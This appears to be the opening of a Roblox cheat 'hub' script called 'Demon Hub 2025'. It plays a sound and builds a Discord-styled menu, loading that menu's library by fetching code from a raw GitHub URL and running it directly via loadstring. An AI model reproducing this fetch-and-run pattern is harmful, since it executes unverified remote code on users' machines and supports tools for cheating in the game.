-- Play notification sound (uses SoundService, cleans up after playing)
task.delay(1, function()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://570433034"
    sound.Volume = 1
    sound.Parent = game:GetService("SoundService")
    sound:Play()
    sound.Ended:Connect(function()
        sound:Destroy()
    end)
end)

-- Load external UI library
local function loadUILibrary(url)
    return loadstring(game:HttpGet(url))()
end
local DiscordLib = loadUILibrary("https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")
local win = DiscordLib:Window("Demon Hub 2025 | Latest Version")
local serv = win:Server("Scripts", "")
